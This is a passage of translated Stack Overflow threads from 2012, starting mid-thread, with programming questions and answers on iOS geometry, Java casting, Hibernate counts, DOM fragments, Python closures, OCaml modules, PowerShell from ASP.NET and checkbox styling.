> 时间：2012-04-22T18:56:36.520

[`strtol`](http://en.cppreference.com/w/cpp/string/byte/strtol)非常擅长这一点。它读取尽可能多的数字，返回数字，并为您提供一个指向导致它停止的字符的指针（在您的情况下是`'^'`）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T19:05:08.340

```
 int num;
    char op;
    int pow;
    if ((std::cin >> num >> op >> pow) && op == '^') {
            // do anything with num and pow
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-22T18:53:03.203

在这种情况下，您的所有数字似乎都低于 10，`exp[0]-'0'`并且`exp[1]-'0'`就足够了。

# ios - 如何纠正这个程序的错误

> ID：10270947
> 
> 赞同：0
> 
> 时间：2012-04-22T18:46:01.057
> 
> 标签：ios

我有一个代码，但在这个代码中有一个错误，我不知道为什么我有这个错误。我输入此代码是因为我希望我的球至少击中屏幕的边框。你可以看到我的代码：

```
CGPoint ballCenter = ball.center;
CGRect ballRect = CGRectMake(50, 73, 50, 50); // an arbitrary location for the ball, you would normally use the frame property of the ball here
CGRect s = [UIScreen mainScreen].bounds;
CGRect adjustedScreenRect = CGRectMake(s.x-50   // take the ball's (width or height) and divide it by two to get the distance to the center. Then multiply it by two and subtract from the appropriate dimension(x offset (width), y offset (height), width (width), height (height)). 
BOOL isOnScreen = CGRectContainsPoint(adjutedScreenRect, ballCenter);
// do whatever with the BOOL from the above line... 
```

我在这一行有一个错误：

```
CGRect adjustedScreenRect = CGRectMake(s.x-50   // take the ball's (width or height) and divide it by two to get the distance to the center. Then multiply it by two and subtract from the appropriate dimension(x offset (width), y offset (height), width (width), height (height)). 
BOOL isOnScreen = CGRectContainsPoint(adjutedScreenRect, ballCenter); 
```

错误是“struct CGRect 中没有名为“x”的成员”。

谢谢你的帮助

答案是`CGRect adjustedScreenRect = CGRectMake(s.origin.x-50
BOOL isOnScreen = CGRectContainsPoint(adjutedScreenRect, ballCenter);`

但是我在 BOOL 上有一个错误 Expected )。

你能帮助我吗

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T18:49:54.703

我想你的意思是`s.origin.x`，不是`s.x`。因为 CGRect 是一个 CGPoint 和一个 CGSize 的结构，所以如果不指定要首先访问的结构的哪一部分，就无法直接访问 CGRect 的 x 值。

编辑：

您从未真正关闭 CGRect 的括号，或满足所有 4 个参数。尝试这个：

```
CGRectMake(s.origin.x-50, s.origin.y, width,height); 
```

# java - 如何访问 Java 中的特定子类方法？

> ID：10270948
> 
> 赞同：0
> 
> 时间：2012-04-22T18:46:03.750
> 
> 标签：java, arraylist

嗨，我有一个类**Property**和 2 个子类**Shop**和**Apartment**。

在另一个类中，我有一个包含商店和公寓的属性的数组列表。我有代码：

```
for(Property prop: properties){
  if(prop.getClass().equals(Shop.class))
       prop.setShopDetails(detail);
  else
       prop.setAppDetails(detail)
} 
```

如何访问 shop 类中的 setShopDetails() 方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:49:10.120

您需要转换`prop`为`Shop`：

```
for(Property prop: properties){
  if(prop.getClass().equals(Shop.class))
       ((Shop) prop).setShopDetails(detail);
  else
       ((Apartment) prop).setAppDetails(detail)
  }
} 
```

然而，更好的方法是在类中定义一个抽象方法`setDetails`并`Property`在每个子类中以不同的方式实现它。您可能还想使用`prop instanceof Shop`而不是`prop.getClass().equals(Shop.class)`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T18:51:08.523

首先，考虑`prop`是 的子类的情况`Shop`。您的 if 条件将返回`false`！这是使用[instanceof 运算符](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/op2.html)的最佳时机。

为了访问这些方法，您需要将对象转换为正确的子类：

```
if(prop instanceof Shop) {
    Shop s = (Shop) prop;
    s.setShopDetails(details);
} else {
    // you get the idea
} 
```

但是，这种方式违背了多态性的目的。为什么不在其中创建一个`setDetails`方法`Property`并允许子类以它们的方式处理它呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T18:50:25.047

首先，在这种情况下你必须打电话的事实`getClass()`通常表明设计有缺陷。您可能希望有一个`abstract` `setDetails`被子类覆盖的方法。

您正在寻找的语言功能是“铸造”。在调用子类方法之前，您希望`Property`像这样进行转换：

`((Shop)prop).getShopDetails(detail);`

# objective-c - 使用情节提要作为子视图？

> ID：10270951
> 
> 赞同：0
> 
> 时间：2012-04-22T18:46:13.317
> 
> 标签：objective-c, ios, cocoa-touch, storyboard, subview

我正在创建一个项目，在该项目中我通过在屏幕上和屏幕外为子视图设置动画来创建自己的自定义导航系统。这些子视图之一是有一个导航控制器，以及许多其他更容易（在这种情况下）使用情节提要创建的元素。我尝试使用以下代码将故事板添加为子视图（运气不佳）。

```
MainSV = [self.storyboard instantiateViewControllerWithIdentifier:@"MainSubView"];

[self.view addSubview:MainSV]; 
```

我收到以下警告。

> 不兼容的指针类型将“UIStoryboard *__strong”发送到 UIView* 类型的参数

现在我并不是因为我理解错误而认为上面的代码应该可以工作或任何东西，所以我要问的是，我怎样才能通过这种方法或任何其他方法，添加一个故事板作为我的子视图`UIView`？谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:10:10.633

您将需要使用仅在 iOS 5 中可用的包含视图控制器 API：

```
[self addChildViewController:mainSV];
[self.view addSubview:mainSV.view]; 
```

您可以阅读文档中的陷阱等：http: [//developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html)

# vim - 用vim编辑id3标签

> ID：10270960
> 
> 赞同：3
> 
> 时间：2012-04-22T18:46:40.617
> 
> 标签：vim, vi, id3, id3-tag, id3v2

有什么方法可以使用 gvim 或 vim 来编辑已经翻录的 .flac 文件上的 id3 标签？另外，也许有人知道将 gvim 标签编辑与 ruby​​ripper 集成的方法？另外，我想在 flac**和**mp3 文件上编辑 id3 标签。

可以以某种方式与 vim 集成的命令行工具也可以完成这项工作。

提前致谢，

伊格纳斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T20:06:58.153

Vim 可能不是您应该使用的工具。专用的命令行实用程序是一个更好的选择。

一些选项：

*   [id3v2](http://id3v2.sourceforge.net/)
*   [mp3信息](http://ibiblio.org/mp3info/)
*   [id3ed](http://freecode.com/projects/id3ed)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-08-16T12:16:48.417

我为此编写了一个名为[taggie](https://github.com/ravicious/taggie/)的工具。从基本原理部分：

> 有时我会从 Bandcamp 下载一个标签混乱的版本，尤其是当我们谈论来自不同艺术家的合辑时。如果版本是新鲜的，MusicBrainz Picard 也无济于事。
> 
> 在 iTunes 中修改专辑或专辑艺术家标签非常容易，因为它为所有曲目设置了一个值。但是，有时您需要更改更多内容：“title”标签的格式为“[title] - [artist]”，或者每个标题都包含一些您想要删除的垃圾。

# mysql - 开发和测试可扩展 Web 应用的最佳方式

> ID：10270962
> 
> 赞同：0
> 
> 时间：2012-04-22T18:46:50.943
> 
> 标签：mysql, web-applications, virtualization

目前我的任务是提高现有 web 应用程序的可扩展性。最初应该有 1 个用于 INSERTS 和 UPDATES 的读/写 MySQL 和 2 个具有复制 MySQL 只读用于 SELECTS 的网络服务器。

问题

1.  我怎样才能在本地做到这一点？我已经有这些服务器的 VirtualBox。有没有更好的解决方案？
2.  我可以使用哪些工具/软件/技术来使其有效？版本控制、测试、基准测试？

# multithreading - 负载平衡 SOAP 请求

> ID：10270963
> 
> 赞同：2
> 
> 时间：2012-04-22T18:47:07.973
> 
> 标签：multithreading, performance, soap, iis-7, load-balancing

我有一个在 Windows 2008 R2、IIS7、ASP 和 .net v2 框架上运行的 SOAP Web 服务。该服务连接到一个 32 位 dll，该 dll 执行通常需要 15 毫秒才能完成的操作。我需要每秒管理来自单个 IP 地址的 100 个并发请求。

在这个论坛和微软网站上关注了许多线程后，我已经能够调整我的服务以实现多达 50 个同时请求，使用soap-ui 和 load-ui 作为测试工具。

我认为我现在唯一的选择是对多台服务器进行负载平衡。在阅读了负载平衡并尝试了来自 loadbalancers.org 的虚拟应用程序后，我不确定如何对来自单个 IP 的 SOAP 请求进行负载平衡，它们似乎只基于 IP 地址进行平衡。这可能吗？

问候，马克。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T17:17:25.703

如果您有带有网络负载平衡的 Windows Server，这绝对是可能的。

查看[http://technet.microsoft.com/en-us/library/cc725691.aspx](http://technet.microsoft.com/en-us/library/cc725691.aspx)了解更多信息。它应该是您的服务器安装的标准配置。

还有其他选择，但这将是您最快和最简单的，因为您似乎已经拥有了必要的组件。

# mysql - 如何在 Hibernate 中进行计数（*）？

> ID：10270967
> 
> 赞同：1
> 
> 时间：2012-04-22T18:47:16.310
> 
> 标签：mysql, hibernate, count

如何在 Hibernate 中计算 MySQL 表中的记录？我尝试了以下 HQL，但它不起作用。

```
SELECT COUNT(*) FROM MEMBERS WHERE `username` =:USERNAME OR  `email` =:EMAIL 
```

它用于以下方法：

```
public boolean checkInfos() {
    Session newSession = NewHibernateUtil.getSessionFactory().openSession();
    int count = (Integer) newSession.createSQLQuery("SELECT COUNT(*) FROM MEMBERS WHERE  `username` ='admin' OR  `email` ='admin'").uniqueResult();

    if (count >= 1) {
        return false;
    } else {
        return true;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T08:53:10.427

您也可以通过使用标准来实现这一点。

```
private Number getCount(){
   Criteria criteria = session.createCriteria(Members.class);
   criteria.add(Restrictions.or(Restrictions.eq("username", "admin"), Restrictions.eq("email","admin")));
   criteria.setProjection(Projections.rowCount());
   return (Number) criteria.list();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T19:06:38.753

我想你需要那个

```
Query q = newSession.createSQLQuery("SELECT COUNT(*) FROM MEMBERS WHERE  username = ? OR  email =?");
q.setParameter( 1, "your username");
q.setParameter(2, "your email"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-23T08:04:38.520

`Select count(*)`返回一个`Long`，而不是一个`Integer`。

还有一件事：您使用的反引号不是每个数据库都接受的。

顺便说一句，您也可以在 HQL 中使用 count(*)。这意味着，您可以使用 createQuery 而不是 createSQLQuery。HQL 的一个优点是，它可以从一个数据库移植到另一个数据库，而 SQL 语句并非总是如此。

# javascript - 在javascript中将innerHTML字符串转换为DOM结构

> ID：10270968
> 
> 赞同：2
> 
> 时间：2012-04-22T18:47:32.803
> 
> 标签：javascript, html, dom

我想将以下字符串转换为 DOM 结构。

```
text node <div>div node</div>text node<p>paraph node</p> text node 
```

一种方法是，

```
mydiv = document.createElement('div');
mydiv.innerHTML = 'text node <div>div node</div>text node<p>paraph node</p> text node'; 
```

在这种方法中，DOM 结构被另一个 div 包裹，这不是我想要的。

经过搜索和阅读，我发现`document.createDocumentFragment()`是最好的方法，因为当将 a 附加`fragment`到节点时，它只是 append `fragment's childNodes`，而不是`fragment itself`

不幸的`innerHTML`是，方法在`fragment`.

我该怎么办？谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-22T18:57:03.413

试试这个：

```
var frag = document.createDocumentFragment();
var mydiv = document.createElement('div');
mydiv.innerHTML = 'text node <div>div node</div>text node<p>paraph node</p> text node';

while( mydiv.firstChild ) {
    frag.appendChild( mydiv.firstChild );
}

document.body.appendChild( frag ); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-07T10:30:45.093

我尝试了此页面上的所有解决方案，但没有一个对我的情况有效（更复杂的 HTML 字符串）。我结束了使用我在这里找到的*insertAdjacentHTML*这种非常简单的方法： [https ://stackoverflow.com/a/7327125/388412](https://stackoverflow.com/a/7327125/388412)

```
div.insertAdjacentHTML( 'beforeend', str ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T22:26:06.763

Esailija 的答案可以跨浏览器使用，并且在大多数情况下都是我现在最喜欢的。专门为此任务设计的另一个选项是[`createContextualFragment()`](https://developer.mozilla.org/en/DOM/range.createContextualFragment)（`Range`另请参阅[DOM Parsing and Serialization 规范](http://html5.org/specs/dom-parsing.html#dom-range-createcontextualfragment)）的方法。这个想法是，它将`DocumentFragment`为指定的 HTML 字符串创建一个与 Range 开头表示的文档中的位置相关的字符串。不幸的是，这种方法在 IE <= 9 中不受支持，尽管[IE 10 会支持它](http://msdn.microsoft.com/en-us/library/ie/hh673538%28v=vs.85%29.aspx#createContextualFragment)。

这是一个例子。假设您打算在正文的末尾插入片段：

```
var html = "text node <div>div node</div>text node<p>paraph node</p> text node";
var range = document.createRange();
range.selectNodeContents(document.body);
range.collapse(false);
var frag = range.createContextualFragment(html);

document.body.appendChild( frag ); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-23T08:18:15.817

好的，为了方便起见，我只是将 Tim 的答案和 Esailija 的答案结合到一个函数中。

```
 function createDocumentFragment (inMarkup) {

        var range, fragment, dummy, elem;

        if (document.createRange && (range = document.createRange())
                && range.selectNodeContents
                && range.createContextualFragment) {

            range.collapse(false);

            range.selectNodeContents(document.body);

            fragment = range.createContextualFragment(inMarkup);

        } else {

            dummy = document.createElement('div');

            fragment = document.createDocumentFragment();

            dummy.innerHTML = inMarkup;

            while((elem = dummy.firstChild)) {

                fragment.appendChild(elem);

            }

        }

        return fragment;

    } 
```

# cocoa - 可可轻量线

> ID：10270969
> 
> 赞同：0
> 
> 时间：2012-04-22T18:47:35.843
> 
> 标签：cocoa, nsstring, boolean, nsinteger

`NSString`, `NSBool`, 并`NSInteger`带有许多额外的功能，这些功能在需要时很好，但在不必要时就变成了包袱。有没有像 bool 和 int 这样的轻量级方法来保留字符串？

*   `NSBool`拥有`BOOL`
*   `NSInteger`拥有`int`

有什么`NSString`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:53:20.333

`NSInteger`只是一个原始的 C 类型（就像`int`-- 并且，准确地说，[`NSInteger`是一个`typedef`to either`long`或`int`取决于 architecture](https://stackoverflow.com/questions/4445173/when-to-use-nsinteger-vs-int)），并且没有`NSBool`. 您可能正在考虑`NSNumber` *对象*。

`NSString`另一方面，对象真的很容易抓住和使用。是的，您可以获取原始字节并将它们放入“ `const char *`”中，但如果您使用的是 Objective C，您会发现将字符串作为 Objective C 对象而不是 C 指针会更容易。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-22T18:53:11.220

您可以使用**`const char *`**

# python - python：如何捕获在非全局祖先外部范围中声明的变量？

> ID：10270970
> 
> 赞同：17
> 
> 时间：2012-04-22T18:47:55.453
> 
> 标签：python, scope

鉴于：

```
def f():
    x = 0
    def g():
        h()
    def h():
        x += 1
        print(x)
    g()

>>> f()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 8, in f
  File "<stdin>", line 4, in g
  File "<stdin>", line 6, in h
UnboundLocalError: local variable 'x' referenced before assignment
>>> 
```

我怎样才能`h`看到`x`变量？

谢谢。

**编辑**

前面应该提到过，我使用的是 Python 2.7.3

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-22T18:59:37.100

您可以创建`x`一个[函数属性](http://www.python.org/dev/peps/pep-0232/)：

```
def f():
    f.x = 0
    def g():
        h()
    def h():
        f.x += 1
        print(f.x)
    g() 
```

此外，从 Python 3 开始，您可以使用[`nonlocal`](http://docs.python.org/release/3.0/reference/simple_stmts.html#the-nonlocal-statement)关键字。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-22T18:58:38.130

如果您使用的是 Python 3，请使用`nonlocal`关键字。放在`nonlocal x`函数的开头`h`。如果您使用的是 Python 2.x，一种解决方法是创建`x`一个包含一个元素的列表，因此您可以对其进行修改：

```
def f():
    x = [0]
    def g():
        h()
    def h():
        x[0] += 1
        print x[0]
    g()

f() 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-22T19:01:05.940

在 Python 3 中，只需使用`nonlocal`：

```
def f():
    x = 0
    def g():
        h()
    def h():
        nonlocal x
        x += 1
        print(x)
    g()
f() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-23T05:32:41.080

我们不能把`x`函数参数作为解决方法吗

```
def f():
    x = 0
    def g():
        h(x)
    def h(x):
        x += 1
        print(x)
    g()

f() 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-06T14:24:34.640

最简单的是使用 dict 或空类，例如：

```
class Empty:
    x = 0

def f():
    closure1 = dict(x=0)
    closure2 = Empty()
    def g(): h(x)
    def h(x):
        closure1["x"] += 1
        closure2.x += 1
    g()
    print closure1["x"], closure2.x 
```

尽管已经提供了许多好的解决方案，但它们也有一些极端情况：

*   根据 Ashwini，非本地仅是 Python 3.x
*   函数属性，每个 ovgolovin，将失败是`f`被重新定义并稍后通过引用调用

# django - Django 模型：检索数据

> ID：10270972
> 
> 赞同：0
> 
> 时间：2012-04-22T18:47:59.587
> 
> 标签：django, django-models

嗨，我有以下课程

```
Class Test1(models.Model):
    user = models.OneToOneField(User)
    myotherid = models.CharField(max_length=255)

Class TestData(models.Model):
    data = models.ForeignKey(Data)
    test1 = models.ForeignKey(Test1)

Class Data(models.Model):
    title = models.CharField(max_length=255) 
```

我对 Django 模型和所有这一切都很陌生，我怎样才能获得 myotherid=1234 和 Data.title= "foo" 的所有 Test1 项目

本质上，执行此 SQL：

```
select Test1.* from Test1 t, TestData td, Data d where t.myotherid=1234 and t.id = td.test1 and td.data = d.id and d.title = "foo" 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:55:14.747

这个`TestData`类是多余的，因为它只是用来定义一个 ManyToMany 关系，你可以直接在 Django 中使用 a `ManyToManyField`- 中间类仍然存在，但没有明确定义。如果您需要存储关系本身的额外信息，您只需要定义它。

所以假设你已经添加`datas = ManyToManyField('Data')`到你的`Test1`类中，你可以简单地这样做：

```
Test1.objects.filter(myotherid=1234, datas__title='foo') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T21:32:04.750

我同意 Daniel 的观点，您可能想考虑使用`ManyToManyField`.

不过，要回答您的问题，以下是您提供的模型的 Django 代码：

```
Test1.objects.filter(myotherid=1234, testdata__data__title='foo') 
```

# javascript - 3 jquery ui 滑块连接

> ID：10270976
> 
> 赞同：0
> 
> 时间：2012-04-22T18:48:48.543
> 
> 标签：javascript, jquery, slider

我尝试连接 3 个 jquery ui 滑块。

3 个值的总和必须始终保持在 100，因此当一个滑块移动时，其他两个必须移动。

我做了一些东西，它可以工作，但速度很慢：http: [//jsfiddle.net/vBsTR/2/](http://jsfiddle.net/vBsTR/2/)

如果您只连接一个滑块，它工作正常（尝试移动第一个）：http: [//jsfiddle.net/tyjJx/2/](http://jsfiddle.net/tyjJx/2/)

有人可以帮忙吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-29T17:13:51.543

我也在寻找这个问题的答案，最后从头开始写

[http://jsbin.com/ojeruc/1/edit](http://jsbin.com/ojeruc/1/edit)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T21:55:47.000

您可以在刷新功能之前检查[event.originalEvent ：](http://jqueryui.com/demos/slider/#event-change)

```
event.originalEvent && (event.originalEvent.type == 'mousemove' || event.originalEvent.type == 'mouseup') && refreshSliders(1); 
```

> 使用 event.originalEvent 来检测值是由鼠标、键盘还是以编程方式更改。

这是你的[例子](http://jsfiddle.net/tyjJx/3/)

# module - 条件模块别名

> ID：10270981
> 
> 赞同：12
> 
> 时间：2012-04-22T18:49:48.943
> 
> 标签：module, ocaml

对于一个班级项目，我正在编写一个程序来评估相同抽象数据结构的不同实现的性能。由于我使用相同的代码来测试它们中的每一个，我希望能够根据用户输入设置模块别名，并通过测试代码运行该模块。

换句话说，我想要类似的东西：

```
let module M = 
  if model = "tree" then TreeModel else
  if model = "hash" then HashModel else
  ListModel
in ... 
```

有没有办法可以使这项工作，或者我做这一切都错了？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-22T19:39:54.317

模块级别没有条件，但您可以为此使用一流的模块：

```
let m = match model with
  | "tree" -> (module TreeModel : MODEL)
  | "hash" -> (module HashModel : MODEL)
  | "list" -> (module ListModel : MODEL)
in let module M = (val m : MODEL)
in ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-05T16:40:29.770

作为@Andreas 的后续行动，至少在最近的 ocaml 版本中，您还可以编写：

```
let (module M : MODEL) = match model with
  | "tree" -> (module TreeModel : MODEL)
  | "hash" -> (module HashModel : MODEL)
  | "list" -> (module ListModel : MODEL)
in ... 
```

# c# - 术语“ ”未被识别为 cmdlet 的名称，

> ID：10270985
> 
> 赞同：5
> 
> 时间：2012-04-22T18:49:59.460
> 
> 标签：c#, asp.net, powershell

我有一个 PowerShell 脚本存储在文件 MergeDocuments.ps1 中。当我从 Windows PowerShell 命令提示符运行脚本时，它运行良好
`.\MergeDocuments.ps1 1.docx 2.docx merge.docx`

从 Windows 控制台应用程序调用脚本也可以正常运行。

当我尝试从 Asp.Net Web 服务调用脚本时，我遇到了一些关于注册表访问的问题。我使用模拟并将网络服务帐户的权限授予注册表项`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell`来解决此问题

接下来我遇到了关于 PowerShell 无法创建 OpenXmlPowerTools.DocumentSource[] 类型的对象的问题，所以我在脚本中添加了以下内容

```
Add-Type -Path "C:\Users\Administrator\Documents\WindowsPowerShell\Modules\OpenXmlPowerTools\OpenXmlPowerTools.dll"
Import-Module OpenXmlPowerTools 
```

现在当前的问题是我收到错误“术语'Merge-OpenXmlDocument'不被识别为cmdlet的名称，......”

**我该如何解决？**

PowerShell 脚本

```
Add-Type -Path "C:\Users\Administrator\Documents\WindowsPowerShell\Modules\OpenXmlPowerTools\OpenXmlPowerTools.dll"

Import-Module OpenXmlPowerTools

# The last argument is the path of the merged document
$noOfSourceDocs = ($($args.length) - 1)

# Create an array to hold all the source documents
[OpenXmlPowerTools.DocumentSource[]] $docs = New-Object OpenXmlPowerTools.DocumentSource[] $noOfSourceDocs

for ($i = 0; $i -lt $noOfSourceDocs; $i++)
{
    $docs[$i] = New-Object -TypeName OpenXmlPowerTools.DocumentSource -ArgumentList $args[$i]
    $docs[$i].KeepSection = 1
}

Merge-OpenXmlDocument -OutputPath $args[-1] -Sources $docs 
```

网络服务 .Net 代码

```
using (new Impersonator(username, domain, password))
{
   // create Powershell runspace
   Runspace runspace = RunspaceFactory.CreateRunspace();
   runspace.Open();

   RunspaceInvoke invoker = new RunspaceInvoke(runspace);
   invoker.Invoke("Set-ExecutionPolicy Unrestricted");

   // create a pipeline and feed it the script file
   Pipeline pipeline = runspace.CreatePipeline();
   Command command = new Command(ConfigurationManager.AppSettings["PowerShellScript"]);
   foreach (var file in filesToMerge)
   {
      command.Parameters.Add(null, file);
   }
   command.Parameters.Add(null, outputFilename);
   pipeline.Commands.Add(command);

   pipeline.Invoke();
   runspace.Close();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T07:06:02.483

您可以尝试`OpenXmlPowerTools`在 PowerShell 系统模块路径中安装模块吗：

```
C:\Windows\system32\WindowsPowerShell\v1.0\Modules 
```

# html - 将复选框检查图像更改为自定义图像

> ID：10270987
> 
> 赞同：35
> 
> 时间：2012-04-22T18:50:02.997
> 
> 标签：html, css, xhtml

我正在尝试使用 CSS 更改复选框的默认“框图像”，但它不起作用。有没有办法解决？

```
.class_checkbox{
    background: url("../images/button_bullet_normal.png") no-repeat scroll 0 0 transparent;
} 
```

```
<input type="checkbox" class="class_checkbox"> 
```

* * *

## 回答 #1

> 赞同：94
> 
> 时间：2012-12-19T13:04:11.463

您可以使用纯 css，只需在复选框中添加一个标签，如下所示：

```
.check_box {
    display:none;
}

.check_box + label{
    background:url('images/check-box.png') no-repeat;
    height: 16px;
    width: 16px;
    display:inline-block;
    padding: 0 0 0 0px;
}

.check_box:checked + label{
    background:url('images/check-box-checked.png') no-repeat;
    height: 16px;
    width: 16px;
    display:inline-block;
    padding: 0 0 0 0px;
} 
```

示例 HTML：

```
 .check_box {
    	display:none;
    }

    .check_box + label{
    	background:url('images/check-box.png') no-repeat;
    	height: 16px;
    	width: 16px;
    	display:inline-block;
        padding: 0 0 0 0px;
    }

    .check_box:checked + label{
        background:url('images/check-box-checked.png') no-repeat;
    	height: 16px;
    	width: 16px;
    	display:inline-block;
        padding: 0 0 0 0px;
    }
```

```
<input type="checkbox" class="check_box" id="checkbox1">
<label for="checkbox1">
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-04-22T18:58:16.473

尝试：

```
<input type="checkbox" class="input_class_checkbox"> 
```

jQuery

```
$('.input_class_checkbox').each(function(){
    $(this).hide().after('<div class="class_checkbox" />');

});

$('.class_checkbox').on('click',function(){
    $(this).toggleClass('checked').prev().prop('checked',$(this).is('.checked'))
}); 
```

小提琴：http: [//jsfiddle.net/cn6kn/](http://jsfiddle.net/cn6kn/)

```
$('.input_class_checkbox').each(function(){
    $(this).hide().after('<div class="class_checkbox" />');

});

$('.class_checkbox').on('click',function(){
    $(this).toggleClass('checked').prev().prop('checked',$(this).is('.checked'))
});
```

```
.class_checkbox {
    width: 20px;  
    height: 20px;
    background-color: red;
}
.class_checkbox.checked {
    background-color: green;
}
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<input type="checkbox" class="input_class_checkbox">
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-11-28T14:47:12.480

我使用纯 CSS 创建了一个 Fiddle。投票最多的答案不处理点击事件并且不能正常工作，因为复选框值不会改变。

这是我的例子：

[http://jsfiddle.net/kEHGN/1/](http://jsfiddle.net/kEHGN/1/)

基本上，我们需要以下html：

```
<div class="checkbox_wrapper">
    <input type="checkbox" />
    <label></label>
</div> 
```

以及以下 CSS：

```
.checkbox_wrapper{
    position: relative;
    height: 16px;
    width: 17px;
}

input[type="checkbox"] {
    opacity:0;
    height: 16px;
    width: 17px;
    position: absolute;
    top: 0;
    left: 0;
    z-index: 2;
}

input[type="checkbox"] + label{
    background:url('../images/unchecked.png') no-repeat;
    height: 16px;
    width: 17px;
    display:inline-block;
    padding: 0 0 0 0px;
    position: absolute;
    top: 0;
    left: 0;
    z-index: 1;
}

input[type="checkbox"]:checked + label{
    background:url('../images/checked.png') no-repeat;
    height: 16px;
    width: 17px;
    display:inline-block;
    padding: 0 0 0 0px;
} 
```

只需检查图像的路线，宽度和高度应该等于图像的宽度和高度。在提琴手上，我使用的是 base64 编码的图像。

我希望它有用。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-06-02T19:19:34.203

我找到了另一种方法，不使用相邻的标签或周围的 div。

我的用例是我有一个 Markdown 解析器，它可以生成那些漂亮的 TODO 列表，我想为它们设置样式。更改生成的 HTML 不是一个选项，所以我想出了这个解决方案：

给定一个这样的复选框：

```
<input type="checkbox" id="cb"> 
```

您可以使用`visibility: hidden`复选框和`visibility: visible`::after 对其进行样式设置，如下所示：

```
#cb {
  visibility: hidden;
}

input#cb::after {
  visibility: visible;
  content: "F";
  color: red;
  background: green;
  padding: 8px;
}

input#cb:checked::after {
  content: " T ";
  color: green;
  background: red;
}
```

```
<!doctype html>
<html>

<body>
  <input type="checkbox" id="cb">
</body>

</html>
```

**编辑：**

@connexo 在评论中指出输入元素不能有内容。可以使用标签元素轻松完成，例如像这样（如果这是错误的，请有人纠正我，我没有方便的非 webkit 浏览器来测试它）。

```
#cb-span * {
  visibility: hidden;
}

input#cb + label::after {
  visibility: visible;
  content: "F";
  color: red;
  background: green;
  padding: 8px;
}

input#cb:checked + label::after {
  content: " T ";
  color: green;
  background: red;
}
```

```
<!doctype html>
<html>

<body>
  <span id="cb-span">
    <input type="checkbox" id="cb">
    <label for="cb"></label>
  </span>
</body>

</html>
```

该复选框与普通复选框一样工作，您可以随意设置样式。

也许它会对某些人有所帮助（我可以将其添加为书签，因为我在网上没有找到类似的东西）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-12-14T13:53:26.520

也许对我的 LESS 样本有用。

```
<div class="custom-checkbox">
    <input component="input" type="checkbox"/>
    <label>Here is caption right to checkbox</label>
</div>

    @imgsize: 25px;
    .custom-checkbox{
        position: relative;

        > input[type="checkbox"] {

        display:none;
        position: absolute;
        top: 0;
        left: 0;

            + label{

                background:url('../img/unchecked.png') no-repeat 0 0;
                background-size:@imgsize;
                height: @imgsize;
                padding: 4px 0 5px 35px;
                display: inline-block;
                -webkit-transition-duration: 0.3s;
                -moz-transition-duration: 0.3s;
                transition-duration: 0.3s;        
            }
        }
        > input[type="checkbox"]:checked + label{

            background:url('../img/checked.png') no-repeat;
            background-size:@imgsize @imgsize;
        }
    } 
```

# wcf - WCF 服务和备份

> ID：10270993
> 
> 赞同：0
> 
> 时间：2012-04-22T18:50:28.493
> 
> 标签：wcf

如果 WCF 服务由于某种原因出现故障，是否有可能托管该服务的另一台服务器可以接管（有点像集群/故障转移）？

您将如何创建这样的解决方案？这怎么可能？在这种情况下可以使用哪些技巧和技术？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:44:42.237

实际上，这里的解决方案是为应用程序的每个集群节点运行一个实例。这意味着如果其中一个应用程序崩溃，其他应用程序仍将处于活动状态。

或者，您可以将应用程序集群并运行它。